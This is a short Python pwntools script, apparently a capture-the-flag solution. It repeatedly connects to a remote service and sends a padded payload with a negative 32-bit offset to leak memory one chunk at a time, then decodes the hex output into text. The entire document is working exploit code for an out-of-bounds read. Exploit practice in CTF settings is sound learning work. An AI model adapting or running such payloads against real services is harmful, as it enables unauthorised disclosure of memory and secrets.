from pwn import *
from struct import pack
import binascii

ascii = b""
for _ in range(64):
    r = remote("amt.rs", 31631)

    print(r.recvline())

    offset = 0x28 - 0x0c
    offset_two = 0x68 - 0x28

    # pack offset_two into a 32 bit little endian integer

    payload = b"a" * offset + struct.pack("<i", -offset_two + _)

    print(payload)
    r.sendline(payload)
    hex = r.recvline().decode().strip() 

    # print the ascii representation of the hex
    ascii += binascii.unhexlify(hex)

    # close the connection
    r.close()

print(ascii)